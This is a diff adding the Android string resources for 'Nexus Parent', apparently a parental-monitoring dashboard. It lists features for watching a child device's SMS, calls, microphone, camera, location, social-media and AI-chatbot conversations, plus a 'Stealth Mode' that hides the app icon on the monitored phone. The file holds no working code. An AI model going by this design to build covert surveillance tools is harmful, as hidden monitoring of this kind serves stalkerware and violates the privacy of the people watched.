@@ -1,0 +1,108 @@
+<resources>
+    <string name="app_name" translatable="false">Nexus Parent</string>
+    
+    <!-- Firebase Web Client ID for Google Sign-In -->
+    <string name="default_web_client_id" translatable="false">727633264906-5vj9go8ta88p9ljp7bs6lj1d3bceq7uj.apps.googleusercontent.com</string>
+    
+    <!-- Navigation Drawer -->
+    <string name="drawer_open">Open navigation drawer</string>
+    <string name="drawer_close">Close navigation drawer</string>
+    
+    <!-- Main Content -->
+    <string name="main_title">Nexus Dashboard</string>
+    <string name="welcome_message">Welcome to Nexus Parent</string>
+    <string name="welcome_instruction">Open the sidebar by swiping right or clicking on the menu button to access the features.</string>
+    
+    <!-- Sidebar Features -->
+    <string name="feature_camera">Camera</string>
+    <string name="feature_screen">Screen</string>
+    <string name="feature_location">Location</string>
+    <string name="feature_sms">SMS</string>
+    <string name="feature_calllog">Call Log</string>
+    <string name="feature_mic">Microphone</string>
+    <string name="feature_notifications">Notifications</string>
+    <string name="feature_chats">Chats</string>
+    <string name="feature_gmail">Gmail</string>
+    <string name="feature_files">Files</string>
+    <string name="feature_wellbeing">Digital Wellbeing</string>
+    <string name="feature_applock">App Lock</string>
+    <string name="feature_wallpaper">Wallpaper</string>
+    <string name="feature_vibrateflash">Vibrate &amp; Flash</string>
+    
+    <!-- Social Media Features -->
+    <string name="feature_whatsapp">WhatsApp</string>
+    <string name="feature_facebook">Facebook</string>
+    <string name="feature_instagram">Instagram</string>
+    <string name="feature_messenger">Messenger</string>
+    <string name="feature_snapchat">Snapchat</string>
+    <string name="feature_telegram">Telegram</string>
+    
+    <!-- AI Assistant Features -->
+    <string name="feature_chatgpt">ChatGPT</string>
+    <string name="feature_claude">Claude</string>
+    <string name="feature_grok">Grok</string>
+    
+    <!-- Feature Descriptions -->
+    <string name="feature_camera_desc">Monitor camera activity</string>
+    <string name="feature_screen_desc">View screen activity</string>
+    <string name="feature_location_desc">Track device location</string>
+    <string name="feature_sms_desc">Monitor SMS messages</string>
+    <string name="feature_calllog_desc">View call history</string>
+    <string name="feature_mic_desc">Monitor microphone usage</string>
+    <string name="feature_notifications_desc">View notifications</string>
+    <string name="feature_chats_desc">Monitor chat messages</string>
+    <string name="feature_gmail_desc">Monitor Gmail activity</string>
+    <string name="feature_files_desc">Browse device files</string>
+    <string name="feature_wellbeing_desc">View usage statistics</string>
+    <string name="feature_applock_desc">Manage app locks</string>
+    <string name="feature_wallpaper_desc">Change wallpaper</string>
+    <string name="feature_vibrateflash_desc">Control vibrate and flash</string>
+    
+    <!-- Social Media Descriptions -->
+    <string name="feature_whatsapp_desc">Monitor WhatsApp messages</string>
+    <string name="feature_facebook_desc">Monitor Facebook activity</string>
+    <string name="feature_instagram_desc">Monitor Instagram activity</string>
+    <string name="feature_messenger_desc">Monitor Messenger chats</string>
+    <string name="feature_snapchat_desc">Monitor Snapchat activity</string>
+    <string name="feature_telegram_desc">Monitor Telegram messages</string>
+    
+    <!-- AI Assistant Descriptions -->
+    <string name="feature_chatgpt_desc">Monitor ChatGPT conversations</string>
+    <string name="feature_claude_desc">Monitor Claude AI conversations</string>
+    <string name="feature_grok_desc">Monitor Grok AI conversations</string>
+    
+    <!-- Toolbar Actions -->
+    <string name="action_ai">AI Assistant</string>
+    <string name="action_profile">Profile</string>
+    <string name="action_settings">Settings</string>
+    
+    <!-- Common -->
+    <string name="loading">Loading…</string>
+    <string name="error">Error</string>
+    <string name="retry">Retry</string>
+    <string name="close">Close</string>
+    
+    <!-- Stealth Mode -->
+    <string name="stealth_mode">Stealth Mode</string>
+    <string name="stealth_active">Stealth Active</string>
+    <string name="stealth_activate_title">Activate Stealth Mode</string>
+    <string name="stealth_deactivate_title">Deactivate Stealth Mode</string>
+    <string name="stealth_activate_message">This will hide the app icon from the child device\'s app drawer.\n\nThe app will only be accessible from this parent dashboard. You can deactivate stealth mode anytime.</string>
+    <string name="stealth_deactivate_message">Are you sure you want to deactivate stealth mode?\n\nThe app icon will become visible in the child device\'s app drawer.</string>
+    <string name="stealth_activate_button">Activate Stealth</string>
+    <string name="stealth_deactivate_button">Deactivate</string>
+    <string name="stealth_processing">Processing…</string>
+    <string name="stealth_timeout">Stealth mode confirmation timeout</string>
+    <string name="stealth_error">Failed to toggle stealth mode</string>
+    <string name="cancel">Cancel</string>
+    
+    <!-- Profile Menu -->
+    <string name="menu_settings">Settings</string>
+    <string name="menu_disconnect">Disconnect</string>
+    <string name="menu_delete_account">Delete Account</string>
+    
+    <!-- Disconnect Dialog -->
+    <string name="disconnect_title">Disconnect from Device</string>
+    <string name="disconnect_message">Are you sure you want to disconnect from this child device?\n\nYou can reconnect anytime using the device ID.</string>
+    <string name="disconnect">Disconnect</string>
+</resources>
